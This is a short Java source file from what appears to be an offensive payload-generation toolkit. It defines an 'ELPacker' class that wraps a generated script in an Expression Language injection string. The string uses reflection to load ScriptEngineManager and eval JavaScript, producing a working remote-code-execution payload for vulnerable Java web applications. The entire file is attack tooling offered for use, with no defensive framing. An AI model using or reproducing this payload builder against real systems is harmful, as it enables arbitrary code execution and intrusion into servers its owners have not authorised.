package com.reajason.javaweb.packer.el;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.PackerMeta;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.packer.scriptengine.ScriptEnginePacker;
import org.kohsuke.MetaInfServices;

/**
 * @author ReaJason
 * @since 2024/12/13
 */
@MetaInfServices(Packer.class)
@PackerMeta(name = Packers.EL, order = 800)
public class ELPacker implements Packer {
    String template = "''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('{{script}}')";

    @Override
    public String pack(ClassPackerConfig config) {
        String script = new ScriptEnginePacker().pack(config);
        return template.replace("{{script}}", script);
    }
}
